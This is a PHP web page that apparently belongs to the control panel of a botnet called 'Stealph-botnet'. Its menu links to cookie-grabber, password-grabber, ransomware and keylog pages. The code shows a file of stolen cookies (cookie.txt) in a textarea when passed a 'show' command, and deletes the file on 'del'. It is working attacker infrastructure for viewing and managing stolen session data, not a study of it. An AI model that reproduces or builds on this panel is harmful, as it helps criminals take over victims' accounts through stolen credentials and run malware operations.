<?php
    include_once 'sql.php';
?>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>FUCK  - WORlD</title>
  <link rel="stylesheet" href="css/term.css">
</head>

<body class="">
  <div class="container on">
    <div class="screen">
      <h3 class="title">
        Stealph-botnet
      </h3>
            <a href="/index.php">Home</a>
                            <a href="/coolist.php">Cookie grabber</a>
                    <a href="/pswdlist.php">password grabber</a>
                <a href="/hol.php">Ransomware</a>
            <a href="/keylist.php">keylogs</a>
      <div class="box--outer">
        <div class="box">
          <div class="box--inner">
              <div class="ScrollStyle">
            <div class="content">
              <div class="holder">
                <b>helow motherfucker;</b> 
                <br>
                <table border="1" width="100%">
                        <?php 
                        
                        switch ($_GET["command"]) {
    case 'show':
        $myfile = fopen("cookie.txt", "r") or die("Unable to open file!");
$hel = fread($myfile,filesize("cookie.txt"));
echo "<textarea>".$hel."</textarea>";
fclose($myfile);
        break;
    case 'del':
    
unlink('cookie.txt');
        break;

    default:

}
                        

?>


                  <div class="row">
                  </div>
              </div>
              </dev>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

</body>

</html>